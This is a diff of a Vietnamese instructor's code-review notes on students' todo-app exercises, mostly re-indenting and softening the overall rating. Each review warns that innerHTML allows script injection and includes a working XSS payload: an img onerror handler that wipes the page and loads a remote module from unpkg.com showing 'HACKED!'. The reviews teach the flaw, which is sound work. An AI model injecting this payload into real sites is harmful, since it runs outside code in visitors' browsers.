@@ -10,12 +10,12 @@
 
 - Do đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.
 
-```js
-<img
-  src=""
-  onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
-/>
-```
+  ```js
+  <img
+    src=""
+    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
+  />
+  ```
 
 - Sau khi người dùng bấm vào sửa task nên focus luôn vào ô `input` mà người dùng cần chỉnh sửa để tăng trải nghiệm người dùng.
 
@@ -23,7 +23,7 @@
 
 - Sau khi sửa task bấm vào `Enter` thì bị reload trang do mặc định của thẻ `form` khi `submit`.
 
-- [x] Đánh giá chung: Bài làm tạm ổn, cần lưu ý một số case đặc biệt cần xử lý để hoàn thiện hơn.
+- [x] Đánh giá chung: Bài làm ổn, cần lưu ý một số case đặc biệt cần xử lý để hoàn thiện hơn.
 
 ## [Nguyen Tien Dat](https://tiendat211294.github.io/f8_offline_k5/buoi-27/)
 
@@ -37,12 +37,12 @@
 
 - Do đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.
 
-```js
-<img
-  src=""
-  onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
-/>
-```
+  ```js
+  <img
+    src=""
+    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
+  />
+  ```
 
 - Sau khi người dùng bấm vào sửa task nên focus luôn vào ô `input` mà người dùng cần chỉnh sửa để tăng trải nghiệm người dùng.
 
@@ -50,7 +50,7 @@
 
 - Chưa xử lý case chuyển đổi trạng thái của một task sang đã hoàn thành và ngược lại.
 
-- [x] Đánh giá chung: Bài làm tạm ổn, cần lưu ý một số case đặc biệt cần xử lý để hoàn thiện hơn.
+- [x] Đánh giá chung: Bài làm ổn, cần lưu ý một số case đặc biệt cần xử lý để hoàn thiện hơn.
 
 ## [Ngo Hoang Kim](https://kzau1612.github.io/FSK5/FSK5/day_27/)
 
@@ -64,12 +64,12 @@
 
 - Do đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.
 
-```js
-<img
-  src=""
-  onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
-/>
-```
+  ```js
+  <img
+    src=""
+    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
+  />
+  ```
 
 - Sau khi người dùng bấm vào sửa task nên focus luôn vào ô `input` mà người dùng cần chỉnh sửa để tăng trải nghiệm người dùng.
 
